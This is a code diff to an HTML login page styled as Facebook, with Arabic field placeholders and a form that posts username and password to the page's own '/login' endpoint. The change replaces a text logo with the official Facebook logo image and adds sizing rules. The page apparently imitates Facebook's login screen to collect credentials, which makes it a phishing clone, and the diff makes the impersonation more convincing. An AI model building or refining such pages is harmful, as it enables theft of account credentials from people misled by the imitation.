@@ -35,6 +35,11 @@
             font-weight: bold;
             margin-bottom: 20px;
         }
+        .logo img {
+            width: 150px; /* Adjust size as needed */
+            height: auto;
+            margin-bottom: 20px;
+        }
         input {
             width: calc(100% - 22px);
             padding: 14px;
@@ -120,6 +125,9 @@
                 font-size: 32px;
                 margin-bottom: 15px;
             }
+            .logo img {
+                width: 120px; /* Adjust size for mobile */
+            }
             input {
                 padding: 12px;
                 font-size: 14px;
@@ -140,7 +148,9 @@
 </head>
 <body>
     <div class="container">
-        <div class="logo">facebook</div>
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        </div>
         <form action="/login" method="POST">
             <input type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             <input type="password" name="password" placeholder="كلمة المرور" required>
